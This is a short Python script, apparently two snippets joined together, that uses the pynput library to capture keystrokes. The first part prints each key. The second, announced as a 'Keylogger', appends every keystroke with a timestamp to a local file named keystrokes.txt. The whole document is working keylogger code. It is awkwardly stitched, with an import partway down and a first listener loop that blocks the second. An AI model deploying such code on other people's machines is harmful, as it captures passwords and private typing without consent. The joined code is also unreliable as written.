from pynput import keyboard
def on_press(key):
    print(f"Key pressed: {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
from datetime import datetime

# Log file path
log_file = "keystrokes.txt"

# Write keystrokes to file
def on_press(key):
    try:
        key_data = f'{datetime.now()} - {key.char}\n'
    except AttributeError:
        key_data = f'{datetime.now()} - [{key}]\n'

    with open(log_file, "a") as file:
        file.write(key_data)

# Start the listener
print("Keylogger started... Press ESC to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
